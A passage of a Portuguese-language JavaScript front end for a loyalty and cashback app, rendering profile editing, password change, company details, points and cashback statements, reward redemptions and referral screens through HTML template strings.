                    <i class="ri-arrow-right-s-line text-slate-400 text-xl"></i>
                </button>
                <button onclick="showScreen('editarPerfil')" class="w-full p-4 flex items-center gap-3 hover:bg-slate-50 transition">
                    <div class="w-9 h-9 rounded-lg bg-slate-100 flex items-center justify-center">
                        <i class="ri-edit-line text-slate-600"></i>
                    </div>
                    <span class="flex-1 text-left font-medium text-slate-700">Editar dados</span>
                    <i class="ri-arrow-right-s-line text-slate-400 text-xl"></i>
                </button>
                <button onclick="showScreen('alterarSenha')" class="w-full p-4 flex items-center gap-3 hover:bg-slate-50 transition">
                    <div class="w-9 h-9 rounded-lg bg-rose-50 flex items-center justify-center">
                        <i class="ri-lock-2-line text-rose-600"></i>
                    </div>
                    <span class="flex-1 text-left font-medium text-slate-700">Alterar senha</span>
                    <i class="ri-arrow-right-s-line text-slate-400 text-xl"></i>
                </button>
            </div>
        </div>

        <div class="px-4 mt-4">
            <h3 class="text-xs text-slate-500 uppercase tracking-wider font-semibold mb-2 px-1">Engajamento</h3>
            <div class="bg-white rounded-2xl border border-slate-200 overflow-hidden divide-y divide-slate-100">
                <button onclick="showScreen('indicacoes')" class="w-full p-4 flex items-center gap-3 hover:bg-slate-50 transition">
                    <div class="w-9 h-9 rounded-lg bg-emerald-50 flex items-center justify-center">
                        <i class="ri-share-line text-emerald-600"></i>
                    </div>
                    <span class="flex-1 text-left font-medium text-slate-700">Indicar amigos</span>
                    <i class="ri-arrow-right-s-line text-slate-400 text-xl"></i>
                </button>
                <button onclick="showScreen('pesquisa')" class="w-full p-4 flex items-center gap-3 hover:bg-slate-50 transition">
                    <div class="w-9 h-9 rounded-lg bg-pink-50 flex items-center justify-center">
                        <i class="ri-emotion-happy-line text-pink-600"></i>
                    </div>
                    <span class="flex-1 text-left font-medium text-slate-700">Avaliar atendimento</span>
                    <i class="ri-arrow-right-s-line text-slate-400 text-xl"></i>
                </button>
            </div>
        </div>

        <div class="px-4 mt-4 pb-6">
            <button onclick="logout()" class="w-full py-3.5 bg-white border border-rose-200 text-rose-600 rounded-2xl font-semibold flex items-center justify-center gap-2 hover:bg-rose-50 transition">
                <i class="ri-logout-box-line text-xl"></i> Sair da conta
            </button>
        </div>
    </div>`;
}

// Tela 7.5: Editar perfil
async function telaEditarPerfil() {
    const c = STATE.cliente;
    const e = STATE.empresa;
    const cor = e.cor_primaria, corSec = e.cor_secundaria;
    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col overflow-y-auto bg-slate-50">
        <div class="px-5 pt-6 pb-10 text-white" style="background:linear-gradient(135deg,${cor},${corSec})">
            <button onclick="showScreen('perfil')" class="text-white/80 mb-3 flex items-center gap-1 text-sm hover:text-white transition">
                <i class="ri-arrow-left-line"></i> Voltar
            </button>
            <h1 class="text-2xl font-bold">Editar dados</h1>
            <p class="text-white/80 text-sm mt-1">Atualize suas informações</p>
        </div>

        <div class="px-4 -mt-6">
            <div class="bg-white rounded-2xl shadow-md border border-slate-100 p-5 flex flex-col items-center gap-3">
                <div id="avatar-preview" class="w-24 h-24 rounded-full border-4 border-slate-100 flex items-center justify-center text-4xl font-bold text-white shadow-md overflow-hidden" style="background:linear-gradient(135deg,${cor},${corSec})">
                    ${c.foto
                        ? `<img src="${c.foto}" class="w-full h-full object-cover" alt="">`
                        : c.nome.charAt(0).toUpperCase()}
                </div>
                <input type="file" id="input-foto" accept="image/png,image/jpeg,image/webp" class="hidden">
                <div class="flex gap-2">
                    <button type="button" id="btn-trocar-foto" class="px-4 py-2 text-sm font-medium rounded-xl border border-slate-200 hover:bg-slate-50 transition flex items-center gap-1.5">
                        <i class="ri-camera-line"></i> ${c.foto ? 'Trocar foto' : 'Adicionar foto'}
                    </button>
                    ${c.foto ? `
                    <button type="button" id="btn-remover-foto" class="px-4 py-2 text-sm font-medium rounded-xl border border-rose-200 text-rose-600 hover:bg-rose-50 transition flex items-center gap-1.5">
                        <i class="ri-delete-bin-line"></i> Remover
                    </button>` : ''}
                </div>
                <p class="text-[11px] text-slate-500">JPG, PNG ou WEBP até 4MB</p>
            </div>
        </div>

        <form id="form-editar-perfil" class="px-4 mt-4 pb-6">
            <div class="bg-white rounded-2xl shadow-md border border-slate-100 p-5 space-y-4">
                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">Nome completo</label>
                    <div class="relative">
                        <i class="ri-user-line absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400"></i>
                        <input name="nome" value="${(c.nome || '').replace(/"/g, '&quot;')}" required
                               class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                    </div>
                </div>

                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">Telefone</label>
                    <div class="relative">
                        <i class="ri-smartphone-line absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400"></i>
                        <input value="${c.telefone || ''}" disabled
                               class="w-full pl-11 pr-4 py-3 bg-slate-100 border border-slate-200 rounded-xl text-slate-500 cursor-not-allowed">
                    </div>
                    <p class="text-[11px] text-slate-500 mt-1 ml-1">O telefone não pode ser alterado por aqui</p>
                </div>

                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">E-mail</label>
                    <div class="relative">
                        <i class="ri-mail-line absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400"></i>
                        <input name="email" type="email" value="${(c.email || '').replace(/"/g, '&quot;')}" placeholder="seu@email.com"
                               class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                    </div>
                </div>

                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">CPF</label>
                    <div class="relative">
                        <i class="ri-id-card-line absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400"></i>
                        <input name="cpf" value="${c.cpf || ''}" placeholder="000.000.000-00" maxlength="14"
                               class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                    </div>
                </div>

                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">Data de nascimento</label>
                    <div class="relative">
                        <i class="ri-cake-2-line absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400 z-10"></i>
                        <input name="data_nascimento" type="date" value="${c.data_nascimento || ''}"
                               class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition text-slate-700">
                    </div>
                    <p class="text-[11px] text-slate-500 mt-1 ml-1">Receba um presente no seu aniversário</p>
                </div>
            </div>

            <button type="submit" class="w-full mt-4 py-3.5 text-white rounded-2xl font-semibold flex items-center justify-center gap-2 shadow-md hover:shadow-lg transition"
                    style="background:linear-gradient(135deg,${cor},${corSec})">
                <i class="ri-save-line"></i> Salvar alterações
            </button>

            <button type="button" onclick="showScreen('perfil')" class="w-full mt-2 py-3 text-slate-600 font-medium rounded-2xl hover:bg-slate-100 transition">
                Cancelar
            </button>
        </form>
    </div>`;

    $('#form-editar-perfil').addEventListener('submit', async (ev) => {
        ev.preventDefault();
        const fd = Object.fromEntries(new FormData(ev.target));
        Object.keys(fd).forEach(k => { if (fd[k] === '') fd[k] = null; });
        try {
            const res = await api('/cliente/perfil', { method: 'PUT', body: JSON.stringify(fd) });
            STATE.cliente = { ...STATE.cliente, ...res.cliente };
            persistir();
            toast('Dados atualizados!', 'success');
            showScreen('perfil');
        } catch (e) { toast(e.message, 'error'); }
    });

    const inputFoto = $('#input-foto');
    $('#btn-trocar-foto').addEventListener('click', () => inputFoto.click());
    inputFoto.addEventListener('change', async () => {
        const file = inputFoto.files[0];
        if (!file) return;
        if (file.size > 4 * 1024 * 1024) { toast('Imagem muito grande (máx 4MB)', 'error'); return; }
        const form = new FormData();
        form.append('foto', file);
        try {
            const res = await api('/cliente/perfil/foto', { method: 'POST', body: form });
            STATE.cliente.foto = res.foto;
            persistir();
            toast('Foto atualizada!', 'success');
            showScreen('editarPerfil');
        } catch (e) { toast(e.message, 'error'); }
    });

    const btnRemover = $('#btn-remover-foto');
    if (btnRemover) {
        btnRemover.addEventListener('click', async () => {
            if (!confirm('Remover foto de perfil?')) return;
            try {
                await api('/cliente/perfil/foto', { method: 'DELETE' });
                STATE.cliente.foto = null;
                persistir();
                toast('Foto removida.', 'success');
                showScreen('editarPerfil');
            } catch (e) { toast(e.message, 'error'); }
        });
    }
}

// Tela 7.6: Alterar senha
async function telaAlterarSenha() {
    const e = STATE.empresa;
    const cor = e.cor_primaria, corSec = e.cor_secundaria;
    const primeiroAcesso = !!STATE.cliente?.senha_temporaria;

    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col overflow-y-auto bg-slate-50">
        <div class="px-5 pt-6 pb-10 text-white" style="background:linear-gradient(135deg,${cor},${corSec})">
            ${primeiroAcesso ? '' : `
            <button onclick="showScreen('perfil')" class="text-white/80 mb-3 flex items-center gap-1 text-sm hover:text-white transition">
                <i class="ri-arrow-left-line"></i> Voltar
            </button>`}
            <h1 class="text-2xl font-bold">${primeiroAcesso ? 'Defina sua senha' : 'Alterar senha'}</h1>
            <p class="text-white/80 text-sm mt-1">${primeiroAcesso ? 'Bem-vindo! Crie uma senha pessoal pra continuar.' : 'Defina uma nova senha de acesso'}</p>
        </div>

        <form id="form-alterar-senha" class="px-4 -mt-6 pb-6">
            <div class="bg-white rounded-2xl shadow-md border border-slate-100 p-5 space-y-4">

                ${primeiroAcesso ? `
                <div class="bg-amber-50 border border-amber-200 rounded-xl p-3 flex gap-2">
                    <i class="ri-information-line text-amber-600 mt-0.5"></i>
                    <p class="text-xs text-amber-800">
                        Você foi cadastrado pela loja com uma <strong>senha temporária</strong>.
                        Pra continuar, crie agora uma senha pessoal só sua.
                    </p>
                </div>` : `
                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">Senha atual</label>
                    <div class="relative">
                        <i class="ri-lock-line absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400"></i>
                        <input name="senha_atual" type="password" required placeholder="Sua senha atual"
                               class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                    </div>
                </div>`}

                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">Nova senha</label>
                    <div class="relative">
                        <i class="ri-lock-2-line absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400"></i>
                        <input name="senha_nova" type="password" required minlength="6" placeholder="Mínimo 6 caracteres"
                               class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                    </div>
                </div>

                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">Confirmar nova senha</label>
                    <div class="relative">
                        <i class="ri-lock-2-line absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400"></i>
                        <input name="senha_nova_confirmation" type="password" required minlength="6" placeholder="Repita a nova senha"
                               class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                    </div>
                </div>

                <div class="bg-slate-50 border border-slate-100 rounded-xl p-3 flex gap-2">
                    <i class="ri-shield-check-line text-slate-500 mt-0.5"></i>
                    <p class="text-xs text-slate-600">Use ao menos 6 caracteres. Misture letras, números e símbolos pra ficar mais segura.</p>
                </div>
            </div>

            <button type="submit" id="btn-salvar-senha"
                    class="w-full mt-4 py-3.5 text-white rounded-2xl font-semibold flex items-center justify-center gap-2 shadow-md hover:shadow-lg transition"
                    style="background:linear-gradient(135deg,${cor},${corSec})">
                <i class="ri-shield-keyhole-line"></i> ${primeiroAcesso ? 'Criar senha e continuar' : 'Atualizar senha'}
            </button>

            ${primeiroAcesso ? '' : `
            <button type="button" onclick="showScreen('perfil')" class="w-full mt-2 py-3 text-slate-600 font-medium rounded-2xl hover:bg-slate-100 transition">
                Cancelar
            </button>`}
        </form>
    </div>`;

    $('#form-alterar-senha').addEventListener('submit', async (ev) => {
        ev.preventDefault();
        const fd = Object.fromEntries(new FormData(ev.target));
        if (fd.senha_nova !== fd.senha_nova_confirmation) {
            return toast('As senhas novas não conferem', 'error');
        }

        const btn = $('#btn-salvar-senha');
        const labelOrig = btn.innerHTML;
        btn.disabled = true;
        btn.innerHTML = '<i class="ri-loader-4-line animate-spin"></i> Salvando...';
        try {
            await api('/cliente/senha', { method: 'PUT', body: JSON.stringify(fd) });
            toast(primeiroAcesso ? 'Senha definida! Bem-vindo.' : 'Senha alterada!', 'success');
            if (STATE.cliente) {
                STATE.cliente.senha_temporaria = false;
                persistir();
            }
            showScreen(primeiroAcesso ? 'home' : 'perfil');
        } catch (e) {
            toast(e.message, 'error');
            btn.disabled = false;
            btn.innerHTML = labelOrig;
        }
    });
}

// Tela 7.8: Sobre a empresa atual + minhas outras empresas
async function telaEmpresa() {
    const data = await api('/cliente/empresas');
    const e = data.empresa_atual;
    const cor = e.cor_primaria, corSec = e.cor_secundaria;

    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col overflow-y-auto bg-slate-50">
        <div class="px-5 pt-6 pb-12 text-white" style="background:linear-gradient(135deg,${cor},${corSec})">
            <button onclick="showScreen('perfil')" class="text-white/80 mb-4 flex items-center gap-1 text-sm hover:text-white transition">
                <i class="ri-arrow-left-line"></i> Voltar
            </button>
            <div class="text-center">
                ${e.logo
                    ? `<img src="${escAttr(e.logo)}" alt="${escAttr(e.nome)}" class="w-20 h-20 mx-auto rounded-2xl bg-white/20 backdrop-blur p-2 mb-3 object-contain">`
                    : `<div class="w-20 h-20 mx-auto rounded-2xl bg-white/20 backdrop-blur flex items-center justify-center text-3xl font-bold mb-3">${esc(String(e.nome || '').charAt(0))}</div>`
                }
                <h1 class="text-2xl font-bold">${esc(e.nome)}</h1>
                <p class="text-white/80 text-xs mt-1">Cliente desde ${esc(e.cliente_desde || '—')}</p>
            </div>
        </div>

        <div class="px-4 -mt-8 pb-6 space-y-4">
            <div class="bg-white rounded-2xl shadow-md border border-slate-100 p-5">
                <h3 class="text-xs text-slate-500 uppercase tracking-wider font-semibold mb-3">Programa de fidelidade</h3>
                <div class="grid grid-cols-2 gap-3 text-center">
                    <div class="bg-slate-50 rounded-xl p-3">
                        <p class="text-xs text-slate-500">Pontos por real</p>
                        <p class="text-xl font-bold mt-1" style="color:${cor}">${e.pontos_por_real} <span class="text-xs text-slate-500 font-normal">/ R$1</span></p>
                    </div>
                    <div class="bg-slate-50 rounded-xl p-3">
                        <p class="text-xs text-slate-500">Cashback</p>
                        <p class="text-xl font-bold text-emerald-600 mt-1">${Number(e.cashback_percentual).toFixed(1).replace('.', ',')}<span class="text-sm font-normal">%</span></p>
                    </div>
                </div>
                <div class="mt-3 pt-3 border-t border-slate-100 grid grid-cols-2 gap-2 text-center">
                    <div>
                        <p class="text-[11px] text-slate-500 uppercase">Seu saldo</p>
                        <p class="text-sm font-bold text-slate-800">${fmtNum(e.pontos)} pts</p>
                    </div>
                    <div>
                        <p class="text-[11px] text-slate-500 uppercase">Seu cashback</p>
                        <p class="text-sm font-bold text-emerald-600">${fmtBRL(e.cashback)}</p>
                    </div>
                </div>
            </div>

            ${(e.telefone || e.email || e.endereco) ? `
            <div class="bg-white rounded-2xl shadow-sm border border-slate-100 p-5">
                <h3 class="text-xs text-slate-500 uppercase tracking-wider font-semibold mb-3">Contato</h3>
                <div class="space-y-3 text-sm">
                    ${e.telefone ? `
                        <a href="tel:${escAttr(String(e.telefone).replace(/\D/g, ''))}" class="flex items-center gap-3 hover:bg-slate-50 -mx-2 px-2 py-1 rounded-lg">
                            <i class="ri-phone-line text-slate-400"></i>
                            <span class="text-slate-700">${esc(e.telefone)}</span>
                        </a>` : ''}
                    ${e.email ? `
                        <a href="mailto:${escAttr(e.email)}" class="flex items-center gap-3 hover:bg-slate-50 -mx-2 px-2 py-1 rounded-lg">
                            <i class="ri-mail-line text-slate-400"></i>
                            <span class="text-slate-700 truncate">${esc(e.email)}</span>
                        </a>` : ''}
                    ${e.endereco ? `
                        <div class="flex items-start gap-3">
                            <i class="ri-map-pin-line text-slate-400 mt-0.5"></i>
                            <span class="text-slate-700">${esc(e.endereco)}</span>
                        </div>` : ''}
                </div>
            </div>` : ''}

            ${data.vinculadas.length > 0 ? `
            <div>
                <h3 class="text-xs text-slate-500 uppercase tracking-wider font-semibold mb-2 px-1">Minhas outras empresas (${data.vinculadas.length})</h3>
                <div class="bg-white rounded-2xl border border-slate-200 overflow-hidden divide-y divide-slate-100">
                    ${data.vinculadas.map(v => `
                        <a href="${escAttr(v.url)}" class="block p-4 flex items-center gap-3 hover:bg-slate-50 transition">
                            ${v.logo
                                ? `<img src="${escAttr(v.logo)}" alt="${escAttr(v.nome)}" class="w-11 h-11 rounded-xl object-contain bg-slate-50">`
                                : `<div class="w-11 h-11 rounded-xl flex items-center justify-center text-white font-semibold" style="background:linear-gradient(135deg,${escAttr(v.cor_primaria)},${escAttr(v.cor_secundaria)})">${esc(String(v.nome || '').charAt(0))}</div>`
                            }
                            <div class="flex-1 min-w-0">
                                <p class="font-semibold text-slate-800 truncate">${esc(v.nome)}</p>
                                <div class="flex gap-3 text-xs text-slate-500 mt-0.5">
                                    <span><i class="ri-coin-line"></i> ${fmtNum(v.pontos)}</span>
                                    <span class="text-emerald-600"><i class="ri-money-dollar-circle-line"></i> ${fmtBRL(v.cashback)}</span>
                                </div>
                            </div>
                            <i class="ri-arrow-right-s-line text-slate-400 text-xl"></i>
                        </a>
                    `).join('')}
                </div>
                <p class="text-[11px] text-slate-400 px-2 mt-2">
                    <i class="ri-information-line"></i> Cada empresa tem login e senha próprios.
                </p>
            </div>` : ''}
        </div>
    </div>`;
}

// Máscara CPF (000.000.000-00)
document.addEventListener('input', (ev) => {
    const el = ev.target;
    if (!el.matches || !el.matches('input[name="cpf"]')) return;
    const v = el.value.replace(/\D/g, '').slice(0, 11);
    let formatted = v;
    if (v.length > 9) formatted = v.slice(0,3)+'.'+v.slice(3,6)+'.'+v.slice(6,9)+'-'+v.slice(9);
    else if (v.length > 6) formatted = v.slice(0,3)+'.'+v.slice(3,6)+'.'+v.slice(6);
    else if (v.length > 3) formatted = v.slice(0,3)+'.'+v.slice(3);
    if (formatted !== el.value) {
        el.value = formatted;
        el.setSelectionRange(formatted.length, formatted.length);
    }
});

window.logout = async () => {
    try { await api('/auth/logout', { method: 'POST' }); } catch {}
    STATE.token = null; STATE.cliente = null;
    persistir();
    showScreen('escolherEmpresa');
};

// Tela 7.7: Extrato (movimentações de pontos e cashback)
async function telaExtrato() {
    const data = await api('/cliente/extrato');
    const e = STATE.empresa;
    const cor = e.cor_primaria, corSec = e.cor_secundaria;

    const renderItem = (m, isCashback) => {
        const credito = m.tipo === 'credito';
        const sinal = credito ? '+' : '−';
        const valor = isCashback ? `R$ ${Number(m.valor).toFixed(2).replace('.', ',')}` : fmtNum(m.pontos) + ' pts';
        const saldoFmt = isCashback ? `R$ ${Number(m.saldo_posterior).toFixed(2).replace('.', ',')}` : fmtNum(m.saldo_posterior) + ' pts';
        const pendente = isCashback && m.processado === false;
        return `
        <li class="py-3 flex items-start gap-3">
            <div class="w-9 h-9 rounded-full flex items-center justify-center flex-shrink-0 ${credito ? 'bg-emerald-100' : 'bg-rose-100'}">
                <i class="ri-arrow-${credito ? 'up' : 'down'}-line ${credito ? 'text-emerald-600' : 'text-rose-600'}"></i>
            </div>
            <div class="flex-1 min-w-0">
                <p class="font-medium text-slate-800 text-sm">${m.descricao || (credito ? 'Crédito' : 'Débito')}</p>
                <div class="flex flex-wrap gap-x-2 text-[11px] text-slate-500 mt-0.5">
                    <span>${m.data}</span>
                    <span class="px-1.5 rounded bg-slate-100 text-slate-600">${esc(m.origem)}</span>
                </div>
                <p class="text-[11px] text-slate-400 mt-0.5">Saldo após: ${saldoFmt}${pendente ? ` &middot; <span class="text-amber-600">libera em ${m.liberado_em}</span>` : ''}</p>
            </div>
            <p class="font-bold text-sm whitespace-nowrap ${credito ? 'text-emerald-600' : 'text-rose-600'}">${sinal}${valor}</p>
        </li>`;
    };

    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col overflow-y-auto bg-slate-50">
        <div class="px-5 pt-6 pb-10 text-white" style="background:linear-gradient(135deg,${cor},${corSec})">
            <button onclick="showScreen('perfil')" class="text-white/80 mb-3 flex items-center gap-1 text-sm hover:text-white transition">
                <i class="ri-arrow-left-line"></i> Voltar
            </button>
            <h1 class="text-2xl font-bold">Extrato</h1>
            <p class="text-white/80 text-sm mt-1">Veja todas as suas movimentações</p>
        </div>

        <div class="px-4 -mt-6">
            <div class="bg-white rounded-2xl shadow-md border border-slate-100 p-1.5 flex gap-1">
                <button id="tab-pontos" onclick="extratoTab('pontos')" class="flex-1 py-2.5 rounded-xl font-semibold text-sm flex items-center justify-center gap-1.5 text-white" style="background:linear-gradient(135deg,${cor},${corSec})">
                    <i class="ri-coin-line"></i> Pontos
                </button>
                <button id="tab-cashback" onclick="extratoTab('cashback')" class="flex-1 py-2.5 rounded-xl font-semibold text-sm text-slate-600 flex items-center justify-center gap-1.5 hover:bg-slate-50 transition">
                    <i class="ri-money-dollar-circle-line"></i> Cashback
                </button>
            </div>
        </div>

        <div class="px-4 mt-3 pb-6">
            <div id="extrato-conteudo-pontos" class="bg-white border border-slate-200 rounded-2xl px-4">
                ${data.pontos.length === 0
                    ? `<div class="py-10 text-center">
                        <div class="w-14 h-14 mx-auto rounded-full bg-slate-100 flex items-center justify-center mb-2">
                            <i class="ri-coin-line text-2xl text-slate-400"></i>
                        </div>
                        <p class="text-sm text-slate-500 font-medium">Nenhuma movimentação de pontos ainda</p>
                       </div>`
                    : `<ul class="divide-y divide-slate-100">${data.pontos.map(p => renderItem(p, false)).join('')}</ul>`}
            </div>
            <div id="extrato-conteudo-cashback" class="bg-white border border-slate-200 rounded-2xl px-4 hidden">
                ${data.cashback.length === 0
                    ? `<div class="py-10 text-center">
                        <div class="w-14 h-14 mx-auto rounded-full bg-slate-100 flex items-center justify-center mb-2">
                            <i class="ri-money-dollar-circle-line text-2xl text-slate-400"></i>
                        </div>
                        <p class="text-sm text-slate-500 font-medium">Nenhuma movimentação de cashback ainda</p>
                       </div>`
                    : `<ul class="divide-y divide-slate-100">${data.cashback.map(c => renderItem(c, true)).join('')}</ul>`}
            </div>
        </div>
    </div>`;
}

window.extratoTab = (qual) => {
    const e = STATE.empresa;
    const cor = e.cor_primaria, corSec = e.cor_secundaria;
    const ativa = qual === 'pontos' ? 'tab-pontos' : 'tab-cashback';
    const inativa = qual === 'pontos' ? 'tab-cashback' : 'tab-pontos';
    const ativaEl = document.getElementById(ativa);
    const inativaEl = document.getElementById(inativa);
    ativaEl.style.background = `linear-gradient(135deg, ${cor}, ${corSec})`;
    ativaEl.classList.add('text-white');
    ativaEl.classList.remove('text-slate-600', 'hover:bg-slate-50');
    inativaEl.style.background = '';
    inativaEl.classList.remove('text-white');
    inativaEl.classList.add('text-slate-600', 'hover:bg-slate-50');
    document.getElementById('extrato-conteudo-pontos').classList.toggle('hidden', qual !== 'pontos');
    document.getElementById('extrato-conteudo-cashback').classList.toggle('hidden', qual !== 'cashback');
};

// Tela 8: Resgates
async function telaResgates() {
    const data = await api('/resgates');
    const e = STATE.empresa;
    const cor = e.cor_primaria, corSec = e.cor_secundaria;

    const statusInfo = (s) => ({
        pendente:  { label: 'Pendente',  cls: 'bg-amber-100 text-amber-700',     icon: 'ri-time-line' },
        aprovado:  { label: 'Aprovado',  cls: 'bg-blue-100 text-blue-700',       icon: 'ri-check-line' },
        entregue:  { label: 'Entregue',  cls: 'bg-emerald-100 text-emerald-700', icon: 'ri-checkbox-circle-line' },
        cancelado: { label: 'Cancelado', cls: 'bg-rose-100 text-rose-700',       icon: 'ri-close-circle-line' },
    }[s] || { label: s, cls: 'bg-slate-200 text-slate-600', icon: 'ri-question-line' });

    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col overflow-y-auto bg-slate-50">
        <div class="px-5 pt-6 pb-10 text-white" style="background:linear-gradient(135deg,${cor},${corSec})">
            <button onclick="showScreen('perfil')" class="text-white/80 mb-3 flex items-center gap-1 text-sm hover:text-white transition">
                <i class="ri-arrow-left-line"></i> Voltar
            </button>
            <h1 class="text-2xl font-bold">Meus resgates</h1>
            <p class="text-white/80 text-sm mt-1">${data.resgates.length} ${data.resgates.length === 1 ? 'resgate' : 'resgates'}</p>
        </div>

        <div class="px-4 -mt-6 pb-6 space-y-3">
            ${data.resgates.length === 0 ? `
                <div class="bg-white rounded-2xl shadow-md border border-slate-100 p-8 text-center">
                    <div class="w-14 h-14 mx-auto rounded-full bg-slate-100 flex items-center justify-center mb-3">
                        <i class="ri-coupon-line text-3xl text-slate-400"></i>
                    </div>
                    <p class="text-sm text-slate-500 font-medium">Nenhum resgate ainda</p>
                    <p class="text-xs text-slate-400 mt-1">Troque seus pontos no catálogo de prêmios</p>
                    <button onclick="showScreen('catalogo')"
                            class="mt-4 px-4 py-2 text-white rounded-xl text-sm font-semibold"
                            style="background:linear-gradient(135deg,${cor},${corSec})">
                        Ver prêmios
                    </button>
                </div>
            ` : ''}
            ${data.resgates.map(r => {
                const info = r.expirado
                    ? { label: 'Expirado', cls: 'bg-rose-100 text-rose-700', icon: 'ri-time-line' }
                    : statusInfo(r.status);
                const utilizavel = ['pendente','aprovado'].includes(r.status) && !r.expirado;
                const diasRestantes = r.expira_em_iso ? Math.ceil((new Date(r.expira_em_iso) - new Date()) / 86400000) : null;
                const alertaPrazo = diasRestantes !== null && diasRestantes >= 0 && diasRestantes <= 3;
                return `
                <div class="bg-white border ${r.expirado ? 'border-rose-200 opacity-75' : 'border-slate-200'} rounded-2xl p-4">
                    <div class="flex items-start gap-3">
                        <div class="w-10 h-10 rounded-xl flex items-center justify-center flex-shrink-0" style="background:${cor}15">
                            <i class="ri-gift-line text-xl" style="color:${cor}"></i>
                        </div>
                        <div class="flex-1 min-w-0">
                            <p class="font-semibold text-slate-800 truncate">${r.recompensa}</p>
                            <p class="text-xs text-slate-500 mt-0.5">${r.data}</p>
                            <div class="flex items-center gap-2 mt-2 flex-wrap">
                                <span class="text-[11px] font-semibold px-2 py-0.5 rounded-full flex items-center gap-1 ${info.cls}">
                                    <i class="${info.icon}"></i> ${info.label}
                                </span>
                                ${r.pontos_usados > 0 ? `<span class="text-xs text-amber-700">−${fmtNum(r.pontos_usados)} pts</span>` : ''}
                                ${r.expira_em && !r.expirado && ['pendente','aprovado'].includes(r.status) ? `
                                    <span class="text-[11px] ${alertaPrazo ? 'text-rose-600 font-semibold' : 'text-slate-500'}">
                                        <i class="ri-time-line"></i> Resgate até ${r.expira_em}
                                    </span>` : ''}
                            </div>
                        </div>
                    </div>
                    ${utilizavel ? `
                        <div class="mt-3 p-3 ${alertaPrazo ? 'bg-rose-50 border-rose-300' : 'bg-amber-50 border-amber-300'} border-2 border-dashed rounded-xl text-center">
                            <p class="text-[11px] ${alertaPrazo ? 'text-rose-700' : 'text-amber-700'} mb-1 uppercase tracking-wider">Apresente no caixa</p>
                            <p class="text-2xl font-bold font-mono tracking-wider ${alertaPrazo ? 'text-rose-800' : 'text-amber-800'}">${r.codigo}</p>
                            ${alertaPrazo ? `<p class="text-[11px] text-rose-600 mt-1">⏰ ${diasRestantes === 0 ? 'Expira hoje!' : `Resta${diasRestantes === 1 ? '' : 'm'} ${diasRestantes} dia${diasRestantes === 1 ? '' : 's'}`}</p>` : ''}
                        </div>
                    ` : `
                        <p class="text-[11px] font-mono text-slate-400 mt-2">${r.codigo}</p>
                    `}
                </div>
            `}).join('')}
        </div>
    </div>`;
}

// Tela 9: Indicações
async function telaIndicacoes() {
    const data = await api('/indicacoes');
    const e = STATE.empresa;
    const cor = e.cor_primaria, corSec = e.cor_secundaria;
    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col overflow-y-auto bg-slate-50">
        <div class="px-5 pt-6 pb-10 text-white" style="background:linear-gradient(135deg,${cor},${corSec})">
            <button onclick="showScreen('perfil')" class="text-white/80 mb-3 flex items-center gap-1 text-sm hover:text-white transition">
                <i class="ri-arrow-left-line"></i> Voltar
            </button>
            <h1 class="text-2xl font-bold">Indique amigos</h1>
            <p class="text-white/80 text-sm mt-1">Ganhe pontos por cada amigo que se cadastrar</p>
        </div>

        <div class="px-4 -mt-6">
            <div class="bg-white rounded-2xl shadow-md border border-slate-100 p-5 text-center">
                <p class="text-[11px] text-slate-500 uppercase tracking-wider">Seu código de indicação</p>
                <p class="text-3xl font-bold font-mono my-2 tracking-widest" style="color:${cor}">${data.codigo_indicacao}</p>
                <div class="flex gap-2 mt-3">
                    <button data-link="${escAttr(data.link)}" onclick="copiarLink(this.dataset.link)" class="flex-1 py-2.5 rounded-xl border-2 font-semibold text-sm flex items-center justify-center gap-1.5 hover:bg-slate-50 transition" style="border-color:${escAttr(cor)}; color:${escAttr(cor)}">
                        <i class="ri-link"></i> Copiar link
                    </button>
                    <button data-link="${escAttr(data.link)}" data-empresa="${escAttr(e.nome)}" onclick="compartilharIndicacao(this.dataset.link, this.dataset.empresa)" class="flex-1 py-2.5 rounded-xl text-white font-semibold text-sm flex items-center justify-center gap-1.5 hover:shadow-lg transition" style="background:linear-gradient(135deg,${escAttr(cor)},${escAttr(corSec)})">
                        <i class="ri-share-forward-line"></i> Compartilhar
                    </button>
                </div>
            </div>
        </div>

        <div class="px-4 mt-3">
            <div class="grid grid-cols-3 gap-2">
                <div class="bg-white border border-slate-200 rounded-2xl p-3 text-center">
                    <p class="text-[10px] text-slate-500 uppercase tracking-wider">Indicados</p>
